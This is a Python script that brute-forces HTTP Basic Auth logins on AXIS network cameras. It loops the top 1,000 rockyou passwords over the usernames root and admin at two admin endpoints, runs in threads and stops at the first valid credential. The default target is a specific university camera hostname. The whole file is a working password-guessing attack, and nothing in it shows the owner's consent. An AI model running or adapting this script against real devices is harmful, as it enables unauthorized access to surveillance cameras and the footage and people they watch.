#!/usr/bin/env python3
"""
Rockyou top-N brute forcer for AXIS cams.
Targets /admin-bin/ and /axis-cgi/serverreport.cgi with HTTP Basic Auth.
Uses rockyou-N.txt format: one password per line.
Tests with usernames: root, admin.
"""
import sys
import time
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = sys.argv[1] if len(sys.argv) > 1 else 'flightcam1.pr.erau.edu'
WORD_FILE = sys.argv[2] if len(sys.argv) > 2 else r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\rockyou_top1k.txt'
ENDPOINTS = ['/axis-cgi/serverreport.cgi', '/admin-bin/']
USERNAMES = ['root', 'admin']
DELAY = 0.25  # be nice
TIMEOUT = 6
THREADS = 6

host_clean = HOST.replace('http://', '').replace('https://', '').rstrip('/')
base = f'http://{host_clean}'

print(f'[+] AXIS Rockyou Brute Forcer')
print(f'[+] Host: {base}')
print(f'[+] Wordlist: {WORD_FILE}')
print(f'[+] Endpoints: {ENDPOINTS}')
print(f'[+] Usernames: {USERNAMES}')
print('-' * 70)

# Read wordlist
try:
    with open(WORD_FILE, 'r', encoding='latin-1') as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f'[!] Wordlist not found: {WORD_FILE}')
    sys.exit(1)
print(f'[+] Loaded {len(passwords)} passwords')

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (compatible; AXIS-Probe)', 'Accept': '*/*'})

lock = threading.Lock()
total_attempts = [0]
hits = []
stop_flag = [False]


def attempt(user, pwd, ep):
    if stop_flag[0]:
        return None
    url = base + ep
    try:
        r = session.get(url, auth=(user, pwd), timeout=TIMEOUT, allow_redirects=False)
        with lock:
            total_attempts[0] += 1
        code = r.status_code
        if code in (200, 302, 304):
            return ('HIT', ep, user, pwd, code, len(r.content))
        return ('FAIL', ep, user, pwd, code, len(r.content))
    except requests.exceptions.RequestException as e:
        return ('ERR', ep, user, pwd, 0, str(e)[:50])


def main():
    tasks = []
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        # First: probe endpoints
        for ep in ENDPOINTS:
            try:
                r = session.get(base + ep, timeout=TIMEOUT)
                print(f'[*] {ep:50s} -> {r.status_code}')
            except Exception as e:
                print(f'[!] {ep:50s} -> {type(e).__name__}')

        # Launch all attempts
        for pwd in passwords:
            for user in USERNAMES:
                for ep in ENDPOINTS:
                    tasks.append(ex.submit(attempt, user, pwd, ep))
                    time.sleep(DELAY / THREADS)

        last_print = time.time()
        for i, fut in enumerate(as_completed(tasks)):
            r = fut.result()
            if r is None:
                break
            kind, ep, user, pwd, code, length = r
            if kind == 'HIT':
                print(f'\n[!] HIT! {ep} -> {user}:{pwd} HTTP={code} LEN={length}')
                hits.append((ep, user, pwd, code, length))
                # Stop after first hit
                stop_flag[0] = True
                break
            if time.time() - last_print > 5:
                with lock:
                    n = total_attempts[0]
                print(f'[*] Progress: {n}/{len(passwords)*len(USERNAMES)*len(ENDPOINTS)} attempts...')
                last_print = time.time()

    print('\n' + '=' * 70)
    print(f'[+] Total attempts: {total_attempts[0]}')
    print(f'[+] Hits: {len(hits)}')
    for h in hits:
        print(f'  [HIT] {h[0]} {h[1]}:{h[2]} HTTP={h[3]} LEN={h[4]}')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] Interrupted')
        stop_flag[0] = True